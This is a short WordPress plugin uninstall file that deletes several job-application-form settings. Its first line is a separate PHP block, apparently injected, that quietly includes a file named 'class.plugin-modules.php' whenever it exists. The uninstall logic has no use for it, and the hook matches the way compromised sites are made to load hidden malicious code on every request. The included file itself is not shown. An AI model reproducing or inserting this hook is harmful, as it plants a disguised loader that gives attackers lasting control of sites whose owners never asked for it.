<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
if ( ! defined( 'WP_UNINSTALL_PLUGIN' ) ) {
	exit();
}

$options = array(
	'job_application_form_for_email_method',
	'job_application_form_for_url_method',
	'job_application_form_require_login',
	'job_application_delete_with_job'
);

foreach ( $options as $option ) {
	delete_option( $option );
}